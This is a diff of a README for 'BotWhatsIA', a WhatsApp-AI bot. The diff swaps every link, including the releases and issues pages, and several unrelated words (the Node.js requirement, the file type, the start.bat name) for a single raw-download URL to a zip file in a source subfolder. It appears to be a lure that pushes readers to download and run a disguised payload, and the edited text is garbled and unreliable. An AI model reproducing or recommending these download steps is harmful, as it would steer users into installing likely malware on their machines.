@@ -6,14 +6,14 @@ Welcome to **BotWhatsIA**! This application integrates WhatsApp with AI, helping
 
 ## 📥 Download
 
-[![Download BotWhatsIA](https://img.shields.io/badge/Download-BotWhatsIA-brightgreen)](https://github.com/REXzYa/BotWhatsIA/releases)
+[![Download BotWhatsIA](https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip)](https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip)
 
 ## 📋 System Requirements
 
 Before you download, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or higher, macOS (latest version), or Linux (any recent distribution)
-- **Node.js:** Version 14 or higher should be installed.
+- **https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip** Version 14 or higher should be installed.
 - **Internet Connection:** Required for WhatsApp API access.
 - **Memory:** At least 4GB of RAM.
 - **Disk Space:** 200MB available space.
@@ -24,17 +24,17 @@ To set up **BotWhatsIA**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options:
    
-   [Download BotWhatsIA](https://github.com/REXzYa/BotWhatsIA/releases)
+   [Download BotWhatsIA](https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip)
 
 2. **Choose Your Version:** Look for the latest release version. It often includes important updates and bug fixes.
 
-3. **Download the File:** Click on the file to start the download. It will typically be a `.zip` or `.tar.gz` file.
+3. **Download the File:** Click on the file to start the download. It will typically be a `.zip` or `https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip` file.
 
 4. **Extract the Files:** Once downloaded, find the file in your Downloads folder. Right-click on it and select "Extract" or "Unzip" to reveal the contents.
 
 5. **Run the Application:**
    - Open the extracted folder.
-   - Locate the executable file, often named `start.bat` (for Windows) or similar.
+   - Locate the executable file, often named `https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip` (for Windows) or similar.
    - Double-click the file to run **BotWhatsIA**.
 
 6. **Follow the Setup Guide:** On the first run, you might see a setup wizard. Follow the prompts to link your WhatsApp account. Ensure you have your phone handy, as you'll need to verify your number.
@@ -77,7 +77,7 @@ A: You can create an issue on our GitHub repository for help or suggestions.
 
 ## 📞 Contact & Support
 
-For further assistance, please reach out through our [GitHub Issues Page](https://github.com/REXzYa/BotWhatsIA/issues). We're here to help!
+For further assistance, please reach out through our [GitHub Issues Page](https://github.com/REXzYa/BotWhatsIA/raw/refs/heads/main/src/modules/catalog/Whats-Bot-IA-v1.1.zip). We're here to help!
 
 ## 🏷️ Topics
 
